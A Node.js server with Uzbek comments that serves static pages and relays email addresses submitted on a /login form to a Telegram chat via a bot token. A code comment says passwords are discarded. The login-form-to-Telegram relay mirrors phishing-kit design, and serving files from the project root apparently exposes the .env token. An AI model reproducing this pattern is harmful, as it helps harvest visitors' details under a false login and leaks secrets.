const http = require('http');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');

const PORT = 3000;
const PUBLIC_DIR = __dirname;

// .env fayldan BOT_TOKEN va CHAT_ID ni o'qiymiz.
function loadEnv() {
  const envPath = path.join(__dirname, '.env');
  if (!fs.existsSync(envPath)) return;

  const lines = fs.readFileSync(envPath, 'utf8').split(/\r?\n/);
  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const index = trimmed.indexOf('=');
    if (index === -1) continue;

    const key = trimmed.slice(0, index).trim();
    const value = trimmed.slice(index + 1).trim().replace(/^['"]|['"]$/g, '');
    if (!process.env[key]) process.env[key] = value;
  }
}

loadEnv();

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const CONTENT_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8'
};

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', chunk => {
      data += chunk;
      if (data.length > 1e6) {
        reject(new Error('So\'rov juda katta'));
        req.destroy();
      }
    });
    req.on('end', () => resolve(data));
    req.on('error', reject);
  });
}

function sendJson(res, status, payload) {
  const body = JSON.stringify(payload);
  res.writeHead(status, {
    'Content-Type': CONTENT_TYPES['.json'],
    'Content-Length': Buffer.byteLength(body)
  });
  res.end(body);
}

async function sendEmailToTelegram(email) {
  if (!BOT_TOKEN || !CHAT_ID) {
    throw new Error('.env ichida BOT_TOKEN yoki CHAT_ID topilmadi');
  }

  const text = `📩 Yangi email\n\nEmail: ${email}`;
  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  const response = await fetch(telegramUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text
    })
  });

  const result = await response.json();
  if (!response.ok || !result.ok) {
    throw new Error(result.description || 'Telegramga yuborib bo\'lmadi');
  }
}

function serveStatic(res, urlPath) {
  const relative = urlPath === '/' ? 'index.html' : urlPath.replace(/^\/+/, '');
  const filePath = path.resolve(PUBLIC_DIR, relative);

  if (!filePath.startsWith(path.resolve(PUBLIC_DIR) + path.sep) && filePath !== path.resolve(PUBLIC_DIR, 'index.html')) {
    sendJson(res, 403, { success: false, message: 'Ruxsat yo\'q' });
    return;
  }

  fs.readFile(filePath, (err, data) => {
    if (err) {
      sendJson(res, 404, { success: false, message: 'Sahifa topilmadi' });
      return;
    }

    const ext = path.extname(filePath).toLowerCase();
    res.writeHead(200, {
      'Content-Type': CONTENT_TYPES[ext] || 'application/octet-stream',
      'Content-Length': data.length
    });
    res.end(data);
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);

  if (url.pathname === '/login' && req.method === 'POST') {
    try {
      const body = await readBody(req);
      const params = new URLSearchParams(body);
      const email = (params.get('email') || '').trim();
      const password = params.get('password') || '';

      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        sendJson(res, 400, { success: false, message: 'Email noto\'g\'ri.' });
        return;
      }

      if (!password) {
        sendJson(res, 400, { success: false, message: 'Parolni kiriting.' });
        return;
      }

      // Parol Telegramga yuborilmaydi va saqlanmaydi.
      await sendEmailToTelegram(email);

      sendJson(res, 200, {
        success: true,
        message: 'Xabaringiz tasdiqlandi'
      });
    } catch (error) {
      console.error('XATO:', error.message);
      sendJson(res, 500, {
        success: false,
        message: 'Telegramga yuborishda xato. .env va bot sozlamalarini tekshiring.'
      });
    }
    return;
  }

  if (req.method === 'GET') {
    serveStatic(res, url.pathname);
    return;
  }

  sendJson(res, 405, { success: false, message: 'Metod qo\'llab-quvvatlanmaydi' });
});

server.listen(PORT, () => {
  console.log(`Server http://localhost:${PORT} manzilida ishlamoqda`);
});
